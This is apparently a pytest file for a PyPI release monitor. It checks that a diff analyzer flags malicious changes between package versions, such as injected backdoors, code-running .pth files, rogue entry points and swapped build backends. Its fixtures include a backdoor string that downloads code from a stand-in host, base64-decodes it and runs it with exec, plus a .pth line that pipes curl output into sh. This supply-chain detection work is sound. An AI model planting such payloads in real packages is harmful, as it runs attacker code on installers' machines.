from pathlib import Path

from pypi_monitor.analyzers.base import ReleaseContext, Signal
from pypi_monitor.analyzers.diff import DiffAnalyzer
from pypi_monitor.domain import Severity

Files = dict[str, str]
BACKDOOR = (
    "import base64, urllib.request\n"
    'exec(base64.b64decode(urllib.request.urlopen("https://evil.test/p").read()))\n'
)


def write(directory: Path, version: str, files: Files, wheel: Files | None) -> None:
    for root, content in (
        (directory / f"a-{version}.tar.gz" / f"a-{version}", files),
        (directory / f"a-{version}-py3-none-any.whl", wheel or {}),
    ):
        for path, text in content.items():
            (root / path).parent.mkdir(parents=True, exist_ok=True)
            (root / path).write_text(text)


def diff(
    tmp_path: Path, old: Files, new: Files, wheels: tuple[Files, Files] | None = None
) -> list[Signal]:
    write(tmp_path / "old", "1.0", old, wheels[0] if wheels else None)
    write(tmp_path / "new", "1.1", new, wheels[1] if wheels else None)
    return DiffAnalyzer().analyze(
        ReleaseContext(
            name="a",
            version="1.1",
            metadata={"previous_version": "1.0"},
            artifact_dir=tmp_path / "new",
            previous_artifact_dir=tmp_path / "old",
        )
    )


BASE = {"a/core.py": "X = 1\n"}


def rules(signals: list[Signal]) -> set[str]:
    return {signal.rule_id for signal in signals}


def test_without_a_baseline_there_is_nothing_to_say() -> None:
    assert DiffAnalyzer().analyze(ReleaseContext(name="a", version="1")) == []


def test_identical_trees_give_no_signals(tmp_path: Path) -> None:
    files = {"a/__init__.py": BACKDOOR}
    assert diff(tmp_path, files, files) == []


def test_formatting_and_version_bump_give_no_signals(tmp_path: Path) -> None:
    old = {"a/__init__.py": '__version__ = "1.0"\nimport json\nX = {"a": 1}\n', "a/b.txt": "x y\n"}
    new = {
        "a/__init__.py": "# Note.\n__version__ = '1.1'\n\nimport json\n\nX = {\n  'a': 1,\n}\n",
        "a/b.txt": "x\n\ny\n",
    }
    assert diff(tmp_path, old, new) == []


def test_backdoor_injected_into_init_is_critical(tmp_path: Path) -> None:
    old = {"a/__init__.py": "X = 1\n"}
    new = {"a/__init__.py": BACKDOOR + "X = 1\n"}

    signals = diff(tmp_path, old, new)

    assert {
        "diff.exec_decoded",
        "diff.install.new_dangerous_call",
        "diff.install.new_import",
        "diff.install.new_url",
    } <= rules(signals)
    assert signals[0].rule_id == "diff.exec_decoded"
    assert signals[0].severity is Severity.CRITICAL
    assert signals[0].file_path == "a-1.1.tar.gz/a-1.1/a/__init__.py"
    assert signals[0].line == 2
    assert "b64decode" in signals[0].evidence


def test_only_changes_count(tmp_path: Path) -> None:
    old = {"a/core.py": "import subprocess\nsubprocess.run(x)\n"}
    new = {"a/core.py": "import subprocess\nsubprocess.run(x)\nsubprocess.run(y)\nZ = 1\n"}
    assert diff(tmp_path, old, new) == []


def test_new_call_in_an_ordinary_function_is_a_weak_signal(tmp_path: Path) -> None:
    old = {"a/core.py": "def f():\n    pass\n"}
    new = {"a/core.py": "import subprocess\n\ndef f():\n    subprocess.run(x)\n"}

    signals = {s.rule_id: s for s in diff(tmp_path, old, new)}

    assert signals["diff.new_dangerous_call"].severity is Severity.MEDIUM
    assert signals["diff.new_import"].severity is Severity.LOW


def test_call_at_the_top_of_an_ordinary_module_runs_on_import(tmp_path: Path) -> None:
    old = {"a/core.py": "X = 1\n"}
    new = {"a/core.py": "import os\nos.system('x')\nX = 1\n"}

    assert "diff.install.new_dangerous_call" in rules(diff(tmp_path, old, new))


def test_code_moved_between_modules_is_not_new(tmp_path: Path) -> None:
    moved = "import subprocess\n\ndef run():\n    return subprocess.run(x)\n"
    old = {"a/one.py": moved, "a/two.py": "X = 1\n"}
    new = {"a/one.py": "Y = 2\n", "a/two.py": "X = 1\n", "a/three.py": moved}
    assert diff(tmp_path, old, new) == []


def test_code_moved_into_init_is_new_there(tmp_path: Path) -> None:
    old = {"a/__init__.py": "X = 1\n", "a/one.py": "import os\nos.system('x')\n"}
    new = {"a/__init__.py": "import os\nos.system('x')\n", "a/one.py": "Y = 1\n"}

    assert "diff.install.new_dangerous_call" in rules(diff(tmp_path, old, new))


def test_tests_of_the_old_version_do_not_make_a_call_familiar(tmp_path: Path) -> None:
    old = {"a/core.py": "X = 1\n", "tests/test_a.py": "import subprocess\nsubprocess.run(x)\n"}
    new = {**old, "a/core.py": "import subprocess\n\ndef f():\n    subprocess.run(x)\n"}

    assert "diff.new_dangerous_call" in rules(diff(tmp_path, old, new))


def test_noisy_files_are_kept_apart_from_combos(tmp_path: Path) -> None:
    old = {"a/core.py": "X = 1\n"}
    new = {
        **old,
        "tests/test_a.py": "import subprocess\nsubprocess.run(x)\n",
        "a/_vendor/lib.py": "import socket\nsocket.socket()\n",
    }

    signals = diff(tmp_path, old, new)

    assert all(signal.rule_id.startswith("noise.diff.") for signal in signals)
    assert all(signal.confidence < 0.25 for signal in signals)


def test_exec_of_decoded_data_is_not_noise_anywhere(tmp_path: Path) -> None:
    old = {"a/core.py": "X = 1\n"}
    new = {**old, "a/_vendor/lib.py": BACKDOOR}

    assert "diff.exec_decoded" in rules(diff(tmp_path, old, new))


def test_sdist_files_outside_the_wheel_are_noise(tmp_path: Path) -> None:
    old = {"src/a/core.py": "X = 1\n", "setup.py": "from setuptools import setup\n"}
    new = {**old, "ci/release.py": "import subprocess\nsubprocess.run(x)\n"}
    wheel = {"a/core.py": "X = 1\n"}

    assert all(s.rule_id.startswith("noise.") for s in diff(tmp_path, old, new, (wheel, wheel)))


def test_change_only_in_the_wheel_is_found(tmp_path: Path) -> None:
    sdist = {"a/core.py": "X = 1\n"}
    old_wheel = {"a/__init__.py": "X = 1\n"}
    new_wheel = {"a/__init__.py": BACKDOOR}

    assert "diff.exec_decoded" in rules(diff(tmp_path, sdist, sdist, (old_wheel, new_wheel)))


def test_new_pth_with_code_is_critical(tmp_path: Path) -> None:
    signals = diff(tmp_path, BASE, {**BASE, "init.pth": "import os; os.system('x')\n"})

    assert rules(signals) == {"diff.file.pth_code"}
    assert signals[0].severity is Severity.CRITICAL


def test_new_pth_with_a_path_is_medium(tmp_path: Path) -> None:
    assert rules(diff(tmp_path, BASE, {**BASE, "a.pth": "lib/extra\n"})) == {
        "diff.file.pth_changed"
    }


def test_new_entry_point(tmp_path: Path) -> None:
    old = {"a.egg-info/entry_points.txt": "[console_scripts]\nrun = a:main\n"}
    new = {"a.egg-info/entry_points.txt": "[console_scripts]\nrun = a:main\npip = a:evil\n"}

    signals = diff(tmp_path, old, new)

    assert rules(signals) == {"diff.file.new_entry_point"}
    assert signals[0].evidence == "pip=a:evil"


def test_build_backend_moved_into_the_tree(tmp_path: Path) -> None:
    old = {"pyproject.toml": '[build-system]\nbuild-backend = "setuptools.build_meta"\n'}
    new = {"pyproject.toml": '[build-system]\nbuild-backend = "b"\nbackend-path = ["."]\n'}

    assert rules(diff(tmp_path, old, new)) == {"diff.file.build_backend_changed"}


def test_new_binary_in_an_sdist(tmp_path: Path) -> None:
    assert rules(diff(tmp_path, BASE, {**BASE, "a/helper.so": "x"})) == {"diff.file.new_binary"}


def test_file_that_stopped_parsing(tmp_path: Path) -> None:
    signals = diff(
        tmp_path, {"a/core.py": "X = 1\n"}, {"a/core.py": "import socket\ndef broken(:\n"}
    )

    assert rules(signals) == {"diff.file.unparseable"}


def test_signals_per_rule_are_limited(tmp_path: Path) -> None:
    new = {f"a/m{i}.py": f"Y = {i}\n" for i in range(50)}

    assert len(diff(tmp_path, BASE, {**BASE, **new})) == 10


def test_wheel_after_sdists_only_is_still_compared(tmp_path: Path) -> None:
    """Otherwise changing the format of a release would switch the whole diff off."""
    wheel = {**BASE, "a-setup.pth": "import os; os.system('curl https://evil.test | sh')\n"}

    found = rules(diff(tmp_path, BASE, {}, ({}, wheel)))

    assert any(rule.startswith("diff.") for rule in found)


def test_change_of_format_alone_says_nothing_about_known_code(tmp_path: Path) -> None:
    assert rules(diff(tmp_path, BASE, {}, ({}, BASE))) == set()
